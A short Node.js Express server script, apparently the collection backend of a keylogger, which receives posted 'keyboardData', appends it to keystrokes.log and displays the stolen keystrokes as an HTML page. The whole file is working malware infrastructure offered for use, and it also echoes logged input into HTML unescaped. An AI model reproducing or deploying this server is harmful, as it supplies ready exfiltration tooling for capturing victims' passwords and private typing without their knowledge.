// server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 8080;
const ip = '192.168.1.107';
//const ip = '0.0.0.0'; // Change this to 0.0.0.0 to listen on all available interfaces


// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Endpoint to receive keystrokes
app.post('/', (req, res) => {
    const keyboardData = req.body.keyboardData;
    if (keyboardData) {
        console.log("Received keyboard data:", keyboardData);
        // Append the received data to a file
        fs.appendFile('keystrokes.log', keyboardData + '\n', (err) => {
            if (err) {
                console.error('Error writing to file', err);
                res.status(500).send('Internal Server Error');
            } else {
                res.status(200).send('Data received');
            }
        });
    } else {
        res.status(400).send('Bad Request: No keyboardData in request');
    }
});

// When a GET request is made to the "/" resource we return basic HTML.
app.get('/', (req, res) => {
    // The GET request shows the data that's logged in the keystrokes.log file.
    try {
        const kl_file = fs.readFileSync('./keystrokes.log', { encoding: 'utf8', flag: 'r' });
        // We send the log file data to the server. We replace the "\n" with <br>
        res.send(`<h1>Logged data</h1><p>${kl_file.replace(/\n/g, '<br>')}</p>`);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }
});

// Start the server
app.listen(port, ip, () => {
    console.log(`Server listening at http://${ip}:${port}`);
});
